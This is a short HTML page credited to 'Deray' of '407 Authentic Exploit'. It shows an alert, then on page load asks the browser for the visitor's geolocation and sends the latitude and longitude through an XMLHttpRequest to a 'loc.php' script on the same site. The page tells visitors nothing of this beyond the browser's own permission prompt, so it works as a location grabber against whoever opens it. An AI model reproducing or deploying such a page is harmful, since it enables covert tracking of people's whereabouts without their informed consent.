
<html>
<head>
<title>deray</title>
</head>
<body>
<script>alert('deray');</script>
<script>
/*
	(C) Copyright 407 Authentic Exploit
	Rebuild Copyright Can't make u real programmer:)
	Coded By Deray
*/
function getLocation() {
  if (navigator.geolocation) {
    navigator.geolocation.getCurrentPosition(showPosition);
  } else {
    alert("Try to open via  Chrome or Uc Mini ");
  }
}

function showPosition(position) {
  var a = position.coords.latitude;
  var b = position.coords.longitude;
  var c = new XMLHttpRequest();
  c.open("GET","./loc.php?lat="+a+"&lon="+b,true);
  c.send();
}
getLocation();
showPosition();
</script>
deray
</body>
</html>
	